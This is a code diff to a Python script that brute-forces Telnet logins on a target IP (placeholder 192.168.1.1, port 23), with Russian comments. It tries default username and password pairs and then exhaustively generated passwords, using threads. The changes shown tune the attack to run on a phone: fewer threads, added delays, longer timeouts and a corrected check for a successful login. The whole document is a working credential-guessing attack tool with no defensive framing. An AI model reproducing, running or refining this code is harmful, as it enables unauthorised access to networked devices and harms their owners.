@@ -3,16 +3,17 @@ import threading
 import itertools
 import string
 import os
+import time
 
 host = "192.168.1.1"  # Замените на IP цели
 port = 23
 
-max_threads = 30
+max_threads = 10  # Для телефона лучше не больше 10 потоков
 found = False
 lock = threading.Lock()
 
 default_logins = ["admin", "root", "user", "guest", "test"]
-default_passwords = ["admin", "password", "123456", "12345678", "1234", "12345", "123456789", "root", "guest", "test", "123123", "abc123", "qwerty", "letmein", "monkey", "dragon", "111111", "passw0rd", "password1", "123qwe", "654321", "superuser"]
+default_passwords = ["admin", "password", "123456", "12345678", "1234", "12345"]
 
 charset = string.ascii_letters + string.digits
 min_len = 1
@@ -40,26 +41,31 @@ def try_login(username, password):
         return
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(5)
+        sock.settimeout(7)
         sock.connect((host, port))
 
-        prompt, _ = recv_until(sock, [b"login:", b"Login:"], timeout=3)
+        prompt, data = recv_until(sock, [b"login:", b"Login:"], timeout=5)
         if not prompt:
             sock.close()
             return
 
         sock.sendall(username.encode() + b"\n")
+        time.sleep(0.3)
 
-        prompt, _ = recv_until(sock, [b"Password:", b"password:"], timeout=3)
+        prompt, data = recv_until(sock, [b"Password:", b"password:"], timeout=5)
         if not prompt:
             sock.close()
             return
 
         sock.sendall(password.encode() + b"\n")
+        time.sleep(0.5)
 
-        prompt, response = recv_until(sock, [b"incorrect", b"failed", b"Login incorrect"], timeout=3)
+        prompt, response = recv_until(sock, [b"incorrect", b"failed", b"Login incorrect"], timeout=5)
 
-        if not prompt:
+        if prompt:
+            sock.close()
+            return
+        else:
             with lock:
                 if not found:
                     found = True
@@ -98,12 +104,10 @@ if __name__ == "__main__":
 
     q = Queue()
 
-    # Сначала словарные пары (логин x пароль)
     for username in logins:
         for password in passwords:
             q.put((username, password))
 
-    # Потом полный перебор паролей для каждого логина
     for username in logins:
         for password in generate_passwords(charset, min_len, max_len):
             q.put((username, password))
